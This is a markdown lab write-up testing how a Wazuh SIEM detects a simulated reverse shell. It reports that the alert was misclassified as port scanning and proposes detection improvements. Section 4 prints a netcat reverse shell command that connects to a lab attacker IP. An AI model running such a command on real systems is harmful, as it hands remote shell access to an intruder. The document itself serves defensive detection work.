# SIEM Detection – Command Execution (Reverse Shell) Analysis

---

## 1. Overview

This phase analyzes the SIEM platform’s ability to detect command execution and post-exploitation activity, specifically focusing on reverse shell behavior.

Unlike brute force or reconnaissance, execution activity represents a **more advanced stage of an attack**, where an attacker attempts to gain interactive access to the target system.

---

## 2. Objective

The objective of this phase is to:

* Analyze detection of reverse shell activity
* Evaluate how execution behavior appears in SIEM alerts
* Identify detection gaps and misclassification
* Understand limitations of existing detection rules

---

## 3. Detection Scenario

During the attack simulation phase:

* A reverse shell attempt was executed from the target system
* The command aimed to establish an outbound connection to the attacker machine
* System and network logs were generated

These logs were collected and forwarded to the Wazuh manager for analysis.

---

## 4. Execution Method

An attempt was made to execute a reverse shell command:

```bash id="x1r9qp"
nc -e /bin/bash 192.168.239.6 4444
```

This command is intended to:

* Spawn a shell on the target system
* Establish a connection to the attacker machine
* Provide remote command execution capability

---

## 5. Detection Method

Detection analysis was performed using the Wazuh Dashboard.

### Query Used

```text id="d9v4sl"
agent.name: ubuntu AND rule.id: 100102
```

---

## 6. Detection Results

Instead of being classified as command execution, the SIEM generated alerts under:

* **Rule ID:** 100102
* **Category:** Port scanning / reconnaissance

This indicates that the activity was detected, but **incorrectly classified**.

---

## 7. Alert Analysis

Observed behavior included:

* Outbound connection attempts from the target system
* Network activity resembling scanning behavior
* Triggering of the port scan detection rule

However:

* No dedicated alert for command execution was generated
* The reverse shell activity was not explicitly identified

---

## 8. Detection Gap Identified

This phase revealed a key limitation:

```text id="b2k7mz"
Reverse shell activity was misclassified as port scanning.
```

### Root Cause

* Detection logic is based on **network behavior patterns**
* Reverse shell activity shares similarities with scanning (connection attempts)
* Lack of specific rules for command execution

---

## 9. Security Implications

This misclassification highlights:

* Potential blind spots in detection systems
* Risk of missing critical post-exploitation activity
* Need for improved detection logic

Without proper classification, attackers may:

* Maintain persistence
* Execute commands undetected
* Escalate privileges

---

## 10. Detection Improvement Opportunities

To address this gap:

* Create custom rules for reverse shell detection
* Monitor process execution (e.g., shell spawning)
* Correlate outbound connections with suspicious commands
* Combine network + process-level indicators

---

## 11. Detection Insight

This phase demonstrates an important concept:

```text id="y9x3pt"
SIEM systems detect behavior patterns, not intent.
```

Accurate detection requires:

* Context awareness
* Rule tuning
* Continuous improvement

---

## 12. Detection Validation

This phase confirms that:

* The activity was partially detected
* Detection logic triggered alerts
* However, classification was inaccurate

This represents a **real-world detection challenge**.

---

## 13. Evidence Collection

Screenshots were captured to demonstrate:

* Wazuh alerts for rule ID 100102
* Reverse shell command execution attempt
* Related system logs

> **Note:** Store images inside the repository and reference them using relative paths.

---

## 14. Conclusion

This phase highlights both the strengths and limitations of SIEM detection.

The results show:

* Successful detection of suspicious activity
* Incorrect classification of execution behavior
* Need for enhanced detection engineering

This insight elevates the project from basic detection to **advanced analytical understanding**.

---

## 15. Supporting Evidence

![Execution Detection Logs](../GITHUB/wzh-rvshl-id.png)

![System Logs](../GITHUB/wzh-id-pwrshl.png)

---
